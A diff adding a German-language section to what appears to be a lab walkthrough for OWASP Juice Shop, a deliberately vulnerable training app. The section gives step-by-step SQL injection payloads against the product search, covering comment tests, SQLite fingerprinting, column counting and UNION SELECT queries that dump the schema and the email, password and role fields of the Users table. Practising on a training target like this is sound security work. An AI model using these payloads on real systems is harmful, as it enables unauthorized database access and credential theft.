@@ -210,7 +210,110 @@ extractAllCredentials();
 
 ---
 
-## 2. JWT Token Dekodierung - Admin Passwort via localStorage
+## 2. SQL Injection - Systematische Database Discovery
+
+### 📝 Beschreibung
+Systematische Entdeckung und Ausnutzung von SQL Injection Schwachstellen in der Juice Shop Anwendung durch die Produktsuche.
+
+### 🎯 Schritt 1: Juice Shop vorbereiten
+1. Öffne Juice Shop (normalerweise http://localhost:3000)
+2. Öffne die Browser-Entwicklertools (F12)
+3. Gehe zum "Network" Tab
+
+### 🔍 Schritt 2: Potenzielle Injection Points identifizieren
+Die häufigsten Angriffspunkte in Juice Shop:
+
+**Produktsuche (einfachster Weg):**
+- Klicke auf die Suchleiste oben
+- Gib einen Suchbegriff ein
+- Beobachte im Network Tab: `GET /rest/products/search?q=apple`
+
+**Login (schwieriger):**
+- `POST /rest/user/login`
+- Parameter: `email` und `password`
+
+**Produkt-Reviews:**
+- `GET /rest/products/1/reviews`
+
+### 🛠️ Schritt 3: Systematische DB-Identifikation
+Nutze die Produktsuche - gib folgendes direkt in die Suchleiste ein:
+
+**1. Test auf SQL Injection:**
+```sql
+apple'))--
+```
+
+**2. Wenn Error kommt, teste verschiedene Kommentare:**
+```sql
+apple'))#
+apple'))/*
+apple')--
+```
+
+### 🔎 Schritt 4: Datenbank-Typ erkennen
+In der Suchleiste eingeben:
+
+**Test 1 - SQLite spezifisch:**
+```sql
+apple')) UNION SELECT sqlite_version()--
+```
+
+**Test 2 - Fehler provozieren:**
+```sql
+apple')) AND 1=2--
+```
+
+**Test 3 - String-Konkatenation testen:**
+```sql
+apple')) UNION SELECT 'a'||'b'--
+```
+
+### 📊 Schritt 5: Spaltenanzahl ermitteln
+```sql
+apple')) ORDER BY 1--
+apple')) ORDER BY 2--
+apple')) ORDER BY 3--
+```
+...bis Fehler kommt
+
+### 🎯 Schritt 6: UNION SELECT mit richtiger Spaltenanzahl
+```sql
+apple')) UNION SELECT 1,2,3,4,5,6,7,8,9--
+```
+
+### 🔧 Praktisches Vorgehen:
+1. Öffne Juice Shop
+2. Klicke auf die Suchleiste (das Lupensymbol oben)
+3. Gib ein: `apple')) UNION SELECT 1,2,3,4,5,6,7,8,9--`
+4. Drücke Enter
+5. Schaue in den Network Tab für die genaue URL
+
+**Die URL sollte so aussehen:**
+```
+http://localhost:3000/rest/products/search?q=apple%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9--
+```
+
+### 💡 Detaillierte Erklärung der Payload:
+- `apple'` - Schließt den ursprünglichen String ab
+- `))` - Schließt die Klammern der WHERE-Bedingung
+- `UNION SELECT` - Kombiniert Ergebnisse aus zwei Queries
+- `1,2,3,4,5,6,7,8,9` - Dummy-Werte für die Spalten
+- `--` - Kommentiert den Rest der ursprünglichen Query aus
+
+### 🎯 Erweiterte Exploitation:
+Nach erfolgreicher Injection können weitere Daten extrahiert werden:
+
+**Tabellen-Information:**
+```sql
+apple')) UNION SELECT name,sql,type,tbl_name,rootpage,sql,NULL,NULL,NULL FROM sqlite_master--
+```
+
+**User-Daten extrahieren:**
+```sql
+apple')) UNION SELECT email,password,role,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
+```
+
+## 3. JWT Token Dekodierung - Admin Passwort via localStorage
 
 ### 📝 Beschreibung
 Eine fortgeschrittene Methode, um das Admin-Passwort durch Dekodierung des JWT-Tokens aus dem localStorage zu ermitteln. Der Token enthält verschlüsselte Benutzerinformationen, einschließlich des Admin-Passworts als MD5-Hash.
